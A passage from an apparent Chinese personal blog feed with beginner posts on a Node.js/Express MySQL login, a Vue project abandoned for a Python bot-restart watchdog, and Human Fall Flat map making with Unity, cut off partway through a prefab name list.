class="keyword">function</span> (<span class="params">error, results</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                    <span class="title function_">res</span>(error.<span class="property">message</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//坑1 查询的数据不是json 是一个rowdatapocket对象</span></span><br><span class="line">                    <span class="keyword">let</span> dataString = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(results);</span><br><span class="line">                    <span class="keyword">let</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(dataString);</span><br><span class="line">                    <span class="title function_">res</span>(data);</span><br><span class="line">                &#125;</span><br><span class="line">                connection.<span class="title function_">end</span>();</span><br><span class="line">            &#125;);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    ) </span><br><span class="line">    <span class="keyword">return</span> promise;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">VertifyUser</span>(<span class="params">username, password</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title class_">GetPassword</span>(username, password).<span class="title function_">then</span>(<span class="function">(<span class="params">results, reject</span>) =&gt;</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//在这里写验证代码</span></span><br><span class="line">            <span class="keyword">let</span> realpass = results[<span class="number">0</span>][<span class="string">&quot;PASSWORD&quot;</span>];</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(password);</span><br><span class="line">            <span class="keyword">if</span> (password == realpass) &#123;</span><br><span class="line">                <span class="title function_">res</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;密码正确&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">res</span>(<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;密码错误&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​</p><h3 id="Express做服务端路由解析"><a href="#Express做服务端路由解析" class="headerlink" title="Express做服务端路由解析"></a>Express做服务端路由解析</h3><p>​好了，接下来加入express模块来做路由。<code>npm install express</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> *使用express做路由解析</span><br><span class="line">*/</span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">const port = 8000;</span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">  console.log(&#x27;We are live on &#x27; + port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//url解析</span><br><span class="line">app.use(express.urlencoded(&#123; extended: true &#125;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//登录验证模块</span><br><span class="line">app.post(&#x27;/login&#x27;, function(req, res) &#123;</span><br><span class="line">    let body = req.body;</span><br><span class="line">    let username = body[&quot;username&quot;];</span><br><span class="line">    let password = body[&quot;password&quot;];</span><br><span class="line">    VertifyUser(username, password).then((results, reject) =&gt; &#123;</span><br><span class="line">        res.send(results);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Error-Cannot-enqueue-Handshake-after-invoking-quit-的解决方案"><a href="#Error-Cannot-enqueue-Handshake-after-invoking-quit-的解决方案" class="headerlink" title="Error: Cannot enqueue Handshake after invoking quit.的解决方案"></a>Error: Cannot enqueue Handshake after invoking quit.的解决方案</h3><p>​这个是因为mysql没给重新连上去导致的，这里直接把连接封装成一个类然后每次调用即可。</p><p><a href="https://blog.csdn.net/m0_37869769/article/details/97822622">CSDN上的解决方案</a></p><h2 id="一些关于JQuery的知识点"><a href="#一些关于JQuery的知识点" class="headerlink" title="一些关于JQuery的知识点"></a>一些关于JQuery的知识点</h2><h3 id="JQuery加载的四种写法"><a href="#JQuery加载的四种写法" class="headerlink" title="JQuery加载的四种写法"></a>JQuery加载的四种写法</h3><blockquote><p><a href="https://blog.csdn.net/msdn_make/article/details/102615958?utm_term=jquery%E6%96%87%E4%BB%B6%E5%86%99%E6%B3%95&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-102615958&amp;spm=3001.4430">https://blog.csdn.net/msdn_make/article/details/102615958?utm_term=jquery%E6%96%87%E4%BB%B6%E5%86%99%E6%B3%95&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-102615958&amp;spm=3001.4430</a></p></blockquote><p><img src="/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C//image-20211105135111317.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vue服务器内容管理网站项目</title>
      <link href="/2021/10/31/vue%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%BD%91%E7%AB%99%E9%A1%B9%E7%9B%AE/"/>
      <url>/2021/10/31/vue%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%BD%91%E7%AB%99%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​因为我的qqbot在运行的时候，经常性的掉线，因为各种各种的原因有了这个个性化的在线的服务器内容管理网站的需求。主要用来，在手边没有电脑的情况下进行服务器的各种内容的管理。</p><h2 id="实现框架"><a href="#实现框架" class="headerlink" title="实现框架"></a>实现框架</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue(ElementUi) + nodejs</span><br></pre></td></tr></table></figure><p>​因为没有、也不需要存储的功能，所以这个网站基本上用不到数据库，需要用的话，可以用yaml文件来存放各种对于服务器的配置。</p><h2 id="功能需求"><a href="#功能需求" class="headerlink" title="功能需求"></a>功能需求</h2><h1 id="Vue安装使用"><a href="#Vue安装使用" class="headerlink" title="Vue安装使用"></a>Vue安装使用</h1><h2 id="安装vue-x2F-cli脚手架"><a href="#安装vue-x2F-cli脚手架" class="headerlink" title="安装vue&#x2F;cli脚手架"></a>安装vue&#x2F;cli脚手架</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @vue/cli</span><br></pre></td></tr></table></figure><h2 id="创建vue项目"><a href="#创建vue项目" class="headerlink" title="创建vue项目"></a>创建vue项目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue create qqbotmanager</span><br></pre></td></tr></table></figure><p>​提示如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">🎉  Successfully created project qqbotmanager.</span><br><span class="line">👉  Get started with the following commands:</span><br><span class="line"></span><br><span class="line"> $ cd qqbotmanager</span><br><span class="line"> $ npm run serve</span><br></pre></td></tr></table></figure><p>​直接按他的执行能成功运行起来就可以了。</p><h2 id="修改默认的端口号"><a href="#修改默认的端口号" class="headerlink" title="修改默认的端口号"></a>修改默认的端口号</h2><p>在项目主目录下的package.json文件夹下面的<code>&quot;scripts&quot;</code>键下的<code>serve</code>键的值改为<code>vue-cli-service serve --port 1001</code></p><h1 id="ElementUi安装使用"><a href="#ElementUi安装使用" class="headerlink" title="ElementUi安装使用"></a>ElementUi安装使用</h1><h2 id="两种方式使用框架"><a href="#两种方式使用框架" class="headerlink" title="两种方式使用框架"></a>两种方式使用框架</h2><p>​第一种方式是直接在head标签里面加一个标签来引入，这种方法十分方便，但是我作为一个新手，还是做点有挑战性的工作吧。所以我采用了第二种使用这个框架的解决方案。</p><h3 id="node引入框架"><a href="#node引入框架" class="headerlink" title="node引入框架"></a>node引入框架</h3><ol><li>安装框架</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install element-plus --save</span><br></pre></td></tr></table></figure><ol start="2"><li>框架使用。直接在框架主目录下的main.js文件里面引入即可，引入方式如下。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ElementPlus</span> <span class="keyword">from</span> <span class="string">&#x27;element-plus&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-plus/dist/index.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title class_">ElementPlus</span>)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="宣告失败-amp-bot上线助手"><a href="#宣告失败-amp-bot上线助手" class="headerlink" title="宣告失败&amp;bot上线助手"></a>宣告失败&amp;bot上线助手</h1><h2 id="失败原因"><a href="#失败原因" class="headerlink" title="失败原因"></a>失败原因</h2><p>​使用前未对这个框架进行调查，发现适配手机端并不像我想象得那么简单，而且如果我做的界面很简单的话用这个东西也是可以的，但是我想要做的东西又很复杂，这个东西就显得有点鸡肋了，远远不如使用安卓或者微信小程序开发，再者qqbot我已经想好新的办法来对抗它经常性掉线的这个bug了，所以我会先用这个想法，做一个简单的bot状态检测与修复。</p><h2 id="bot下线原因列举"><a href="#bot下线原因列举" class="headerlink" title="bot下线原因列举"></a>bot下线原因列举</h2><ol><li>go-cqhttp不稳定，掉线。</li><li>我写的bot插件不稳定，掉线。</li></ol><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><ol><li><p>单独写一个状态检测脚本，每10分钟，对go-cqhttp和bot插件进行一次状态检测。</p></li><li><p>状态检测脚本代码如下：</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, time</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data1 = os.popen(<span class="string">&#x27;lsof -i:5701&#x27;</span>).readlines() <span class="comment">#返回一个list类型的结果</span></span><br><span class="line">    data2 = os.popen(<span class="string">&#x27;lsof -i:5700&#x27;</span>).readlines()  <span class="comment"># 返回一个list类型的结果</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data1) == <span class="number">2</span> <span class="keyword">and</span> <span class="built_in">len</span>(data2) == <span class="number">2</span>:</span><br><span class="line">        time.sleep(<span class="number">600</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(data1) != <span class="number">2</span>:</span><br><span class="line">        os.system(<span class="string">&quot;nohup sudo python ../plugin/main.py &gt; /dev/null 2&gt;&amp;1 &amp;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已成功重启bot插件&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(data2) != <span class="number">2</span>:</span><br><span class="line">        os.system(<span class="string">&quot;nohup sudo  ../go-cqhttp &gt; /dev/null 2&gt;&amp;1 &amp;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已成功重启bot&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">100</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>人类一败涂地地图制作文档</title>
      <link href="/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3/"/>
      <url>/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>​首先，要创建人类一败涂地的项目的话，必须使用指定的unity的版本，然后导入Unity Hub即可。下载地址：<a href="https://download.unity3d.com/download_unity/6902ad48015d/Windows64EditorInstaller/UnitySetup64-2017.4.13f1.exe?_ga=2.167398334.1681694428.1548147157-1096542433.1538500433">Unity2017.4.13f1</a> ←点击下载，人类一败涂地创意工坊必须使用2017.4.13F1版本，<strong>如果不使用2017.4.13F1版本，会出现未知BUG和不能正常使用人类一败涂地游戏资源包的问题</strong></p><p>​创建一个普通的3D的项目即可，我把这个文件放在了我专门存放项目的盘里面了。</p><h2 id="导入人类一败涂地组件"><a href="#导入人类一败涂地组件" class="headerlink" title="导入人类一败涂地组件"></a>导入人类一败涂地组件</h2><h3 id="先安装人类一败涂地"><a href="#先安装人类一败涂地" class="headerlink" title="先安装人类一败涂地"></a>先安装人类一败涂地</h3><p>​这个安装因为我事先已经在steam购买了这个人类一败涂地，所以直接下载安装就行了，所以如果说你没买的话，我也没尝试盗版的游戏是不是也可以进行这个导入package的操作，你也可以自己尝试一下。</p><h3 id="资源包位置-amp-导入资源包"><a href="#资源包位置-amp-导入资源包" class="headerlink" title="资源包位置&amp;导入资源包"></a>资源包位置&amp;导入资源包</h3><p>​默认下载地址的话，资源包的位置为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\Steam\steamapps\common\Human Fall Flat\WorkshopPackage\Human.unitypackage</span><br></pre></td></tr></table></figure><p><img src="/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3//image-20211028213804267.png" alt="image-20211028213804267"></p><p>​超多资源，一键导入即可。注意：这里导入所用的时间不短，估计差不多有一盏茶的时间，趁这个时间喝杯茶刚刚好。</p><h2 id="地图主要的几个点"><a href="#地图主要的几个点" class="headerlink" title="地图主要的几个点"></a>地图主要的几个点</h2><p>​一个关卡里面分的有几个重要的点，分别是出生点、死亡点、通观点等。那怎么找到这个关卡呢？这里可以直接搜索，如下图。圈住的那个就是我们需要使用到的关卡组件，可以直接拉到我们的场景中去。</p><p><img src="/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3//image-20211028220422961.png"></p><blockquote><p>出生点(InitialSpawnpoint)</p><p>死亡点(FallTrigger)</p><p>通关点(PassTrigger)</p></blockquote><h2 id="组件查找"><a href="#组件查找" class="headerlink" title="组件查找"></a>组件查找</h2><p>​这个英文的资源包对我们英语非常差劲的人来说是非常具有理解难度的，所以有个大哥就把这些个组件的名字拿出来翻译了一下，我们想找组件的话，只需要搜索组件前面的英文名称即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">                    【全部关卡参考位置】</span><br><span class="line"></span><br><span class="line">在文件栏里找到assets 然后搜索prefabtestbeds，之后会出现一个文件夹，点击进去后会出现很多unity的图标，然后每个unity图标都是每个关卡，每个关卡都是官方的一关，拖进游戏对象栏后则可以以看，然后可以浏览游戏模组对象，记住他们的名字有利于以后做地                     </span><br><span class="line"> 如果记不住这里有文件名称；</span><br><span class="line">1：【阿兹特克】</span><br><span class="line">2：【搬运】</span><br><span class="line">3：【城堡】</span><br><span class="line">4：【圣诞节】大厅关卡</span><br><span class="line">5：【通全关后的字幕】</span><br><span class="line">6：【黑暗】</span><br><span class="line">7：【拆除】</span><br><span class="line">8：【冰】</span><br><span class="line">9：【豪宅】</span><br><span class="line">10：【山峰】</span><br><span class="line">11：【保龄球】大厅关卡</span><br><span class="line">12：【发电厂】</span><br><span class="line">13：【蒸汽】</span><br><span class="line">14：【火车】</span><br><span class="line">15：【水】</span><br><span class="line">                    【官方关卡模组名称】</span><br><span class="line"></span><br><span class="line">YellowMetalMechSmallRemoteControl1【提示-遥控器】</span><br><span class="line">LightGreyMetalFloorSmallBrokenRails1【断了的铁轨】</span><br><span class="line">LightWoodMechLargeTrainTrack1【长铁轨】</span><br><span class="line">LightWoodMechMediumTrainTrack1【短铁轨】</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DarkStoneFloorSmallImpactLocation1【散装石头】</span><br><span class="line">DarkGreyMetalMechLargeTrainEngine1【火车】</span><br><span class="line">LightGreyMetalMechLargeTrainEngineBoxCar1【火车客车】</span><br><span class="line">RedMetalmechLowTrainCarriage1【运输列车】</span><br><span class="line">RedMetalMechMediumTrainCarriage1【货箱火车】</span><br><span class="line">MetalMechPressureSwitchDoorwLight1【带压力板的门】</span><br><span class="line">MetalMechLift2Meter2Controls1【升降电梯】</span><br><span class="line">DarkGreyMetalBridgeLargeIndustrialCatwalkwRailingsTwin1【铁桥】</span><br><span class="line">YellowMetalBridgeSmallBridgeWithServoUptoFlat1【可以倒下的板子】</span><br><span class="line">YellowMetalMechSmallHook1【钩子】</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WhiteMetalBuildingSmallGreenhouseLeanTo1【火车关卡的斜墙】</span><br><span class="line">WhiteMetalBuildingSmallArchedGreenhouse2【火车关卡的短墙】</span><br><span class="line">WhiteMetalBuildingSmallArchedGreenhouse1【火车关卡的短墙】</span><br><span class="line">DarkStoneFloorLargeDrapingBrokenFloor1【小型斜坡】</span><br><span class="line">DarkWoodDecorationLargeStandAloneStereoSpeaker1【音响】</span><br><span class="line">DarkWoodDecorationLargeGlassTopCoffeeTable1玻璃柜台</span><br><span class="line">DarkGreyMetalDecorationLargeTV1【电视】</span><br><span class="line">LightWoodMechLargeDeadTreewRope1【带绳子的树】</span><br><span class="line">WhiteMetalBuildingLargeArchedGreenhouse1【火车关卡的房顶】</span><br><span class="line">WhiteMetalBuildingLargeArchedGreenhouse2【火车关卡的房顶2】</span><br><span class="line">LightWoodDecorationLargeClimbingBranches1【树枝1】</span><br><span class="line">LightWoodDecorationLargeClimbingBranches2【树枝2】</span><br><span class="line">LightWoodDecorationLargeClimbingBranches4【树枝3】</span><br><span class="line">LightWoodDecorationLargeClimbingBranches5【树枝4】</span><br><span class="line">LightWoodDecorationLargeClimbingBranches6【树枝5】</span><br><span class="line">LightWoodDecorationMediumClimbingBranches1【树枝6】</span><br><span class="line">LightWoodDecorationSmallClimbingBranches1【树枝7】</span><br><span class="line">FabricDecorationShortPlushSofa1【沙发】</span><br><span class="line">LightWoodDecorationMediumParkBench1【椅子】</span><br><span class="line">MetalMechMediumButtonDoor1【带按钮的门】</span><br><span class="line">MetalMechMedium2ButtonDoor1【按两次的门】</span><br><span class="line">MetalMechMedium2ButtonDoorwExitLight1【一起按的门】</span><br><span class="line">LightStoneBridgeMediumSinglePieceHumped1【一座桥】</span><br><span class="line">DarkWoodDoorMediumWoodenDouble1【木门】</span><br><span class="line">LightWoodMechLargeCatapult1【投石机】</span><br><span class="line">LightRockColumnMediumCollapsingColumn1【会倒塌的石柱】</span><br><span class="line">LightWoodBuildingSmallLeanToThatchedRoof1【有门的小房子】</span><br><span class="line">LightWoodBridgeSmallBridgeSinglePiece1【一座木桥】</span><br><span class="line">LightStoneStepsLargeExampleStairs1【石楼梯】</span><br><span class="line">LightGreyMetalMechSmallLantern1【灯笼】</span><br><span class="line">LightGreyMetalMechMediumDanglingLantern1【长灯笼】</span><br><span class="line">LightWoodContainerMediumWoodenBucket1【木桶】</span><br><span class="line">LightStoneWalllargeDestructibleBrick1【城墙】</span><br><span class="line">LightWoodMechLargeMouseWheel1【滚轮】</span><br><span class="line">LightWoodDoorMediumDoublewithLockRoundTop1【带锁的门】</span><br><span class="line">LightGreyMetalDecorationMediumBell1【钟】</span><br><span class="line">LightStoneWallLargeBrokenWindow1【带窟窿的窗门】</span><br><span class="line">LightRockMechMediumRollingRock1【一块圆石】</span><br><span class="line">DarkWoodBuildingLargeWindmill1【风车】</span><br><span class="line">LightGreyMetalMechSmallBarrelRamp1【滑坡，长长的】</span><br><span class="line">LightStoneBuildingMediumModernCliffSideHouse1【豪宅房子】</span><br><span class="line">LightWoodBuildingVillageInn1【带滑滑梯的房子】</span><br><span class="line">GreyStoneEdgeMediumGrassFlooringExternalCurve1【普通的绿石板】</span><br><span class="line">DarkWoodStepsDoubleParkourSuspendedPlanks2【会掉下去的桥】</span><br><span class="line">DarkStoneMechMediumBallCounterweight1【超级大铅球】</span><br><span class="line">LightSandStoneBridgeMediumAztecSlab1【可以推倒的石板】</span><br><span class="line">GreyStoneStepsLargeOvergrownStoneSteps1【青苔地形】</span><br><span class="line">DarkStoneDecorationGiantBobStatue1【巨型神像】</span><br><span class="line">LightWoodMechSmallFlamingTorch1 【火把】</span><br><span class="line">Crate1x1x1【普通的木箱】</span><br><span class="line">watersquare 【水】</span><br><span class="line">LightWoodMechSmallRowingBoat1【木船】</span><br><span class="line">WhiteMetalMechMediumSpeedboat1【快艇】</span><br><span class="line">DarkGreyMetalMechMediumChainwTwoEyes1【绳索】</span><br><span class="line">LightWoodMechLargePaddleWaterWheel1【风车】</span><br><span class="line">RedMetalMechLargeShippingContainerLift1【勾货大架子】</span><br><span class="line">RedMetalMechLargeShippingContainer1【集装箱】</span><br><span class="line">LightStoneBuildingLargeLighthouse1【灯塔】</span><br><span class="line">DarkGreyMetalDecorationSmallCagedLight1【下水道灯】</span><br><span class="line">LightGreyMetalMechSmallPushButton1【奇怪的红灯】</span><br><span class="line">DarkGreyMetalMechSmallFreighter1【游轮】</span><br><span class="line">DarkWoodDecorationLargeTreeWithLeavesSingleCrown3【树】</span><br><span class="line">DarkWoodDecorationLargeTreeWithLeaveSingleCrown4【树2】</span><br><span class="line">DarkWoodDecorationMediumCornerBasedTree2【树3】</span><br><span class="line">DarkWoodStepsMediumStairwayBroken1【断楼梯】</span><br><span class="line">LightSandStoneWallMediumOvergrownTopper1【青苔石板】</span><br><span class="line">IceDecorationLargeIcicle1【大透明冰块】</span><br><span class="line">DarkGreyMetalMechLargeSkiLift1【缆车】</span><br><span class="line">SnowDecorationLargeSnowMountain1【冰山】</span><br><span class="line">LightVegetationDecorationMediumSnowCovered1【雪松树】</span><br><span class="line">LightVegetationDecorationLargeSnowCovered2【雪松树】</span><br><span class="line">IceMechSmallBlock1【冰方块】</span><br><span class="line">DarkWoodMechSmallSledge1【雪橇】</span><br><span class="line">LightWoodDecorationSmallWarningSign2【警告牌】</span><br><span class="line">LightWoodDecorationSmallWarningSign1【禁止牌】</span><br><span class="line">SnowManWithGrowingHead【雪人】</span><br><span class="line">LightWoodMechSmallDetonator1【引爆器】</span><br><span class="line">RedMetalMechSmallDynamite1 (1)【炸药】</span><br><span class="line">LightWoodMechSmallSnowboard1【滑雪板】</span><br><span class="line">RedMetalMechSmallDynamite1【炸药】</span><br><span class="line">LightRockFloorVlargeSnowyPlatform1【小型雪山】</span><br><span class="line">LightRockFloorSmallSnowyPlatform1【小型雪山】</span><br><span class="line"></span><br><span class="line">DyingVegetationDecorationLargeSnowCovered1【高松树】</span><br><span class="line">DarkRoseWoodMechLargeSnowCannon1【吹雪的风扇】</span><br><span class="line">DyingVegetationDecorationMediumSnowCovered1【小松树】</span><br><span class="line"></span><br><span class="line">LightGreyMetalDecorationSmallWindow1【雪屋玻璃】</span><br><span class="line"></span><br><span class="line">LightStoneMechLargeStatueBridge1【巨人雕像】</span><br><span class="line">GlassMechVlargeWindowPane1【玻璃】</span><br><span class="line">LightStoneBoulderSmallBoulder1【小石头】</span><br><span class="line">DarkGreyMetalBridgeSmallIndustrialCatwalkPost1【一个棍子】</span><br><span class="line">YellowMetalMechSmallCradledPlatformLinkedLever1【移动搬运机器】</span><br><span class="line">LightStoneMechSmallDestructible1【可以砸碎的石墙】</span><br><span class="line">LightWoodMechLargeReel1【一个圆滚轮】</span><br><span class="line">LightWoodMechMediumDoorBarrier1【几个粘在墙上的木板】</span><br><span class="line">OrangePaperMechLargeCementBag1【沙垫】</span><br><span class="line">YellowMetalMechWreckingBallCrane1【小型起重机】</span><br><span class="line">BlueMetalDecorationLargeTsection1【下水管道】</span><br><span class="line">BlueMetalDecorationLargeTubeElbowSection1【下水管道】</span><br><span 